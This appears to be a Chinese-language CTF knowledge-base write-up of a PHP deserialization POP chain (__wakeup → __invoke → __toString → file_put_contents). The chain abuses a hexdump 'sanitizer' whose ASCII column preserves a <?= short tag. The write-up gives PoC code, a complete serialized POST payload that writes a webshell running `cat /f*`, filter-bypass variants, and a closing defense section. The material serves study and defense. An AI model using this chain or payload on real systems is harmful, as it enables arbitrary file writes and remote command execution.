---
id: web-php-deserialization-pop-hexdump-ascii-column-php-shorttag-webshell
title: PHP 反序列化 POP 链：__wakeup 调属性 → __invoke → __toString → file_put_contents，hexdump 的 ASCII 列保留 <?= 短标签使写入文件仍可执行
type: scenario
domain: web
path: web/php/deserialization
technique: php-pop-chain-wakeup-invoke-tostring-hexdump-ascii-shorttag-file-write
tags:
- php
- deserialization
- pop-chain
- magic-methods
- wakeup
- invoke
- tostring
- file-write
- webshell
- ctf
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-T2-2
  verified_at: '2026-11-07T23:15:59+08:00'
  notes: 已对照 16579 原文核对：源码类链 SDU::__wakeup→STU::__invoke→CTF::__toString→file_put_contents 与 PassWAF1/PassWAF2/PassWAF3 及 payload(s:20 PD89YGNhdCAvZipgOw==)、track.php 回显 flag 与图25/26 一致；未验证点：真实环境需 open_basedir/目录可写前提，hexdump ASCII 列仅在图26 一行 dump 中体现
url: /docs/web/php/deserialization/web-php-deserialization-pop-hexdump-ascii-column-php-shorttag-webshell/
draft: false
kb_aliases:
- easy_ser
- SDU __wakeup 调属性
- STU __invoke echo
- CTF __toString file_put_contents
- PassWAF2 hexdump
- ASCII 列保留短标签
- 反序列化写 track.php
- 2024 春秋杯
---

## 一句话结论

入口把 `$_POST['data']` 直接 `unserialize()`，类链为 `SDU::__wakeup()` 用 `$this->Dazhuan()` 把属性当函数调用触发 `STU::__invoke()`、其内 `echo $this->stu` 又把对象转字符串触发 `CTF::__toString()`；`__toString` 里先 `base64_decode(hackman)` 得到命令、过一遍「危险函数名黑名单」和「文件名不能含 `..`/`/`」两道检查，再 `file_put_contents($filename, PassWAF2($data))`。关键点是 `PassWAF2` 按「每 16 字节一组十六进制 + 同组 ASCII 列」排版输出：十六进制列把真字节编码掉了，但**ASCII 列原样保留了载荷里的 `<?=` 短标签和后随的反引号命令**，于是写进 `track.php` 的文本在访问时仍会被 PHP 解析执行——十六进制变换只是看起来像“消毒”，实际把代码藏进了 dump 的右侧列。

## 原理

- **三个魔术方法串成一条链**：`unserialize` 时先触发 `SDU::__wakeup()`；它执行 `$Dazhuan = $this->Dazhuan; $Dazhuan();`——把可控属性当函数调用，若该属性是对象就触发其 `__invoke()`。`STU::__invoke()` 执行 `echo $this->stu`，`echo` 一个对象会触发其 `__toString()`。`CTF::__toString()` 就是最终写文件的位置。整条链不需要任何“用户可控字符串拼接进 `eval`”，全靠魔术方法的隐式调用顺序。
- **两道过滤各自挡什么**：`PassWAF1($data)` 对 base64 解码后的明文 `preg_match` 黑名单 `eval/system/popen/exec/assert/phpinfo/shell_exec/pcntl_exec/passthru/putenv`——挡的是“函数名直写”；`PassWAF3($filename)` 挡 `\.\.` 与 `\/`——挡的是目录穿越，所以只能写到当前目录（`track.php` 这类相对文件名可行）。反引号执行（``` `cmd` ```）、`cat` 等不在黑名单里，是绕过点。
- **PassWAF2 为什么会“漏”**：它的实现是
  `foreach (str_split($str,16) as $v) { $hex=implode(' ',str_split(bin2hex($v),4)); $ascii=...把控制字符换成 '.'...；$output .= sprintf("%08x: %-40s %-16s\n", $count,$hex,$ascii); }`
  **完整十六进制列**确实不可执行，但同一行右侧的 `ascii` 列在字节可打印时原样输出明文，包括 `<`、`?`、`=`、`` ` ``。而 PHP 解析文件时，`<?=` 短标签出现在**任意位置**都会开启 PHP 模式，不只是文件开头；于是 `track.php` 的正文形如
  `00000000: 3c3f 3d60 6361 7420 2f66 2a60 3b <?=`cat /f*`;`
  访问时先原样输出左侧 dump 文本，然后执行 `<?=` 后的反引号命令，把 `/f*` 的内容（flag）打印出来——原文截图里正是“一行 hexdump + 紧跟 flag”的响应。
- **为什么必须 base64 一层**：`hackman` 在序列化里先 base64（原文 `PD89YGNhdCAvZipgOw==` 解码为 `<?=`cat /f*`;`），`__toString` 里再 `Base64Decode`。这层编码让序列化串里不出现 `<`/`` ` ``/`cat` 等显眼字符，同时也避免反序列化过程本身把字面量当代码。
- **payload 构造的落点**：`SDU->Dazhuan = STU`、`STU->stu = CTF`、`CTF->hackman = base64(命令)`、`CTF->filename='track.php'`；`CTF::__destruct()` 只 `echo "bye"`，不在链上，属干扰项。

## 触发条件

- 存在 `unserialize($_POST[...])`/`unserialize($cookie)` 等可控反序列化入口，且相关类（含 `__wakeup`/`__invoke`/`__toString`）已加载。
- 链尾 sink 为 `file_put_contents($filename, <经过变形的内容>)`，filename 可控（哪怕过滤了 `/` 和 `..`，仍可写当前目录的相对文件名）。
- 内容变形函数（如“转十六进制 dump”“转 base64 后拼注释”“`sprintf` 格式化留 ASCII 列”）保留了可打印字符——只要 `<?`/`<?=` 能在变形结果里完整出现，写入的 `.php` 就仍可执行。
- 写入目录可被 Web 访问（同目录或已知路径），且 `.php` 在该目录被解析。

## 利用步骤

1. 读源码，列出所有魔术方法并连链：`__wakeup` 内是否把属性当函数调用（→`__invoke`）、`__invoke` 内是否 `echo` 属性（→`__toString`）、`__toString` 内是否是写文件 sink。
2. 审计 sink 前的过滤：确认黑名单作用在“解码后的明文”还是“原始串”、`preg_match` 是否用 `i/m` 且未加锚点、文件名过滤是否只挡 `..` 与 `/`（即可用相对名 `shell.php`）。
3. 审计内容变形函数：把它对一段测试串（含 `<?=` 与反引号）的输出写出来，确认 ASCII 列是否原样保留这些字符；若保留，写进去的就是“文本 + 可执行短标签”的混合文件。
4. 选定命令：用反引号或 `cat`/`ls` 等不在黑名单的命令，避免出现 `system`/`exec` 等字样；把命令 base64 编码后填 `hackman`。
5. 本地用同名类 `serialize()` 生成 payload（属性顺序按类定义），POST 到入口；观察是否回声 `hack?`（`__toString` 成功路径）。
6. 请求写出的文件，确认左侧 dump 文本之后返回了命令输出（原文得到 flag）。

## PoC

构造 payload（原文写法，仅类定义需要按目标源码对齐）：

```php
<?php
class STU{ public $stu; }
class SDU{ public $Dazhuan; }
class CTF{ public $hackman; public $filename; }

$sdu = new SDU();  $stu = new STU();  $ctf = new CTF();
$sdu->Dazhuan = $stu;          // __wakeup 里 $stu() → STU::__invoke
$stu->stu     = $ctf;          // echo $ctf  → CTF::__toString
$ctf->hackman = base64_encode('<?=`cat /f*`;');   // 反引号命令，避开函数名黑名单
$ctf->filename = 'track.php';                     // 不能含 / 与 ..，写当前目录
echo serialize($sdu);
```

请求（`data` 为上面的序列化串，URL 编码后 POST）：

```text
POST /index.php
Content-Type: application/x-www-form-urlencoded

data=O:3:"SDU":1:{s:7:"Dazhuan";O:3:"STU":1:{s:3:"stu";O:3:"CTF":2:{s:7:"hackman";s:20:"PD89YGNhdCAvZipgOw==";s:8:"filename";s:9:"track.php";}}}
```

随后访问 `GET /track.php`：先输出 hexdump 文本，再执行 `<?=` 的 `cat /f*`，页面末尾出现 flag（原文为 `flag{44ab7d7195a1f156aa2fbc1ceba61ec}`）。

## 变体与关联

- 变体：内容变形换成 `chunk_split(base64_encode(...))`、`wordwrap`、`sprintf("%s", ...)` 等“原样保留可打印字符”的函数，只要 `<?`/`<?=` 不被拆断，写出的 `.php` 依然可执行；反之若变形会插入换行切断 `<?php`（如每 4 字符插空格），需要改用 `<?=` 之外的可拼回形式或换文件名后缀（`.phtml`/`.htaccess`）。
- 变体：若文件名过滤只挡 `..`，可用绝对路径 `/var/www/html/x.php`（`/` 被挡时用 `./`、`..%2f` 编码或子目录名拼接绕过）；若同时限制后缀，可写 `.htaccess` 开 `AddType`/`SetHandler`，或用 `phtml`。
- 变体：链头可能不是 `__wakeup` 而是 `__destruct`/`__construct`/`__call`/`__get`；链中各跳点常见是 `echo`、字符串拼接、`preg_match`、`strlen`、`in_array`（都会触发 `__toString`）。
- 关联：[[web-php-deserialization-wakeup-pregmatch-tostring-get-invoke-read]]（同为 `__wakeup`→`__toString`→`__invoke` 的魔术链，但终点是读文件）、[[web-php-deserialization-s-hex-letter-blacklist-eval]]（黑名单绕过思路）、[[web-php-deserialization-pop-filelogger-webshell]]（`__destruct`→写 WebShell）、[[web-php-deserialization-magic-chain-eval-wakeup-bypass]]（魔术链到 eval）。
- 边界：`CTF::__toString()` 里 `return;` 之后 `return "really!"` 不会执行第二次；若 `preg_match` 因编码/超长而失败（返回 false）也可能绕过黑名单；写入文件若被 `open_basedir`/只读目录限制则链失败。

## 检测与防御

- 检测（审计侧）：`unserialize` 可控入口 + 存在“魔术方法互相隐式触发”的类（`__wakeup` 里调属性、`__invoke` 里 `echo`、`__toString` 里 `file_put_contents`）是强特征；再叠加一个“把内容转十六进制/格式化”的消毒函数，应直接视为无效消毒。
- 检测（运行时）：请求体中出现长序列化串（`O:`/`s:` 结构）+ 随后同目录出现新的 `.php` 文件并被访问，是典型链式告警。
- 修复：不用 `unserialize` 处理外部输入（改用 `json_decode` 等白名单结构）；content sink 不要接受用户可控文件名（固定落盘目录 + 随机名 + 后缀白名单）；消毒函数必须是“重新序列化/丢弃不可打印字符”的正向白名单，而不是“把字节转成十六进制后仍保留 ASCII 列”的伪消毒；写入目录禁止 PHP 解析。
- 加固：`disable_functions` 覆盖反引号与 shell 函数、`open_basedir` 限制写目录、对 `unserialize` 前做 HMAC 校验（签名不过就拒绝），并给写文件接口加权限与审计。
